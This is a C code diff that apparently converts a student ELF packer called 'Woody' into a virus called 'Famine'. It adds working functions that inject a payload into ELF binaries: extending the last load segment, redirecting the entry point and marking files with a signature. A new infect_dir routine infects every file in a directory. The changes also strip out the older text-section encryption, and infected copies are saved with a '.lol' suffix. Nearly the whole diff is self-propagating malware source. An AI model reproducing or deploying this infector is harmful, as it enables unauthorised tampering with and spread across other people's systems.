@@ -30,20 +30,6 @@ void encrypt(char *s, uint64_t n, uint32_t *k){
 	}
 }
 
-int encrypt_text_section(char *s, size_t n){
-	Elf64_Ehdr *h = (void*)s;
-	Elf64_Phdr *ph = ((void*)s) + h->e_phoff;
-	char key_double[16];
-
-	size_t text_off = elf_off_text_section(s,n);
-	if (text_off == 0) return FALSE;
-	size_t text_length = elf_size_text_section(s,n);
-	if (text_length == 0) return FALSE;
-	//printf("%zu v %zu\n", text_off, text_length);
-	encrypt(s + text_off, text_length, (uint32_t*)KEY);
-	return TRUE;
-}
-
 //=============================================================
 
 static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
@@ -69,7 +55,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 	*n = (*n) + add;
 }
 
-void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_addr, size_t text_length){
+void update(char *b, size_t n, size_t old_entry, size_t entry){
 	//add a few information about himself
 	Elf64_Ehdr *bh = (void*)b;
 	size_t pos = elf_offset_entry(b, n);
@@ -79,13 +65,13 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_addr,
 	p[1] = entry - pos;
 	//printf("diff: %zx, size: %zx\n", entry - pos, n);
 	p[2] = n;
-	size_t ok = max(text_addr,entry) - min(text_addr,entry);
-	p[3]=ok;
-	p[4] = text_length;
+	//size_t ok = max(text_addr,entry) - min(text_addr,entry);
+	//p[3]=ok;
+	//p[4] = text_length;
 	//inserting KEY
 	p[5] = ((size_t*)OLD_KEY)[0];
 	p[6] = ((size_t*)OLD_KEY)[1];
-	encrypt((char*)(p+7), 8, (uint32_t*)KEY);
+	encrypt((char*)(p+7), 15, (uint32_t*)KEY);
 }
 
 static int _infect(char **s, size_t *n, char *b, size_t bn){
@@ -94,10 +80,6 @@ static int _infect(char **s, size_t *n, char *b, size_t bn){
 
 	size_t old_entry = h->e_entry;
 	int x = elf_last_load_segment(*s, *n);
-	size_t text_addr = elf_addr_text_section(*s,*n);
-	if (text_addr == 0) return FALSE;
-	size_t text_length = elf_size_text_section(*s,*n);
-	if (text_length == 0) return FALSE;
 	if (ph[x].p_memsz < ph[x].p_filesz) return fail("corrupted binary");
 	size_t diff = ph[x].p_memsz - ph[x].p_filesz;
 	if (diff > 0){
@@ -119,39 +101,74 @@ static int _infect(char **s, size_t *n, char *b, size_t bn){
 	elf_change_size_last_load_segment(*s, *n, bn);
 	elf_set_off_entry(*s, *n, pos + 1 + elf_offset_entry(b, bn));
 	h = (void*)*s;
-	update((*s) + pos + 1, bn, old_entry, h->e_entry, text_addr, text_length);
+	update((*s) + pos + 1, bn, old_entry, h->e_entry);
 	return TRUE;
 }
 
 //=============================================================
 
 int check_already_packed(char *s, size_t n){
-	char *sig = "Woody version 1.0 (c)oded by ndombre-agadhgad";
+	char *sig = "Famine version 1.0 (c)oded by ndombre-agadhgad";
 	size_t len = slen(sig)-1;
 	Elf64_Ehdr *h = (void*)s;
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
 	//check if size is enoug
-	if (entry + DATA + 8*sizeof(size_t) + len >= n)
+	if (entry + DATA + 9*sizeof(size_t) + len >= n)
 		return fail("invalid entry point");
 	size_t *p = ((size_t *)(char*)(s + entry + DATA));
-	if (sncmp((char*)(p+8), sig, slen(sig)-1) == 0)
+	if (sncmp((char*)(p+9), sig, slen(sig)) == 0)
 		return fail("already packed");
 	return TRUE;
 }
 
-int create_woody(char *fname, char *b, size_t bn, int force){
+char *debug_name(char *fname){
+	char *s = malloc(slen(fname)+5);
+	int x;
+	for (x = 0; fname[x]; x++)
+		s[x] = fname[x];
+	s[x] = '.';
+	s[x+1] = 'l';
+	s[x+2] = 'o';
+	s[x+3] = 'l';
+	s[x+4] = '\0';
+	return s;
+}
+
+int infect(char *fname, char *b, size_t bn, int force){
 	char *s; size_t n;
 	if (!fget(fname, &s, &n))
 		return fail("failed to open the file");
 	if (elf_check_valid(s, n) == FALSE) return FALSE;
-	if (!force && !check_already_packed(s, n) == TRUE) return FALSE;
+	if (!check_already_packed(s, n) && !force) return FALSE;
 
 	//after insert, update data
-	if (!encrypt_text_section(s,n))
-		return FALSE;
 	if (!_infect(&s,&n, b, bn))
 		return FALSE;
-	if (!fput("woody", s, n))
+	if (!fput(debug_name(fname), s, n))
 		return fail("failed to save to woody");
 	return TRUE;
 }
+
+#define LIM 1024
+
+int infect_dir(char *dirname, char *b, size_t bn){
+	struct linux_dirent *d;
+	char		*p;
+	char		tmp[LIM];
+	size_t		size;
+
+	if (!getdir(dirname, &p, &size)) return FALSE;
+	size_t x = 0;
+	while (x < size){
+		d = (struct linux_dirent*)(p + x);
+		if (d_isfile(d)){
+			add_base((char *)tmp, dirname, d->d_name, LIM);
+			print(">>>>: ");println(tmp);
+			infect(tmp, b, bn, FALSE);
+		}
+		x += d->d_reclen;
+	}
+	println("leave");
+	free(p);
+}
+
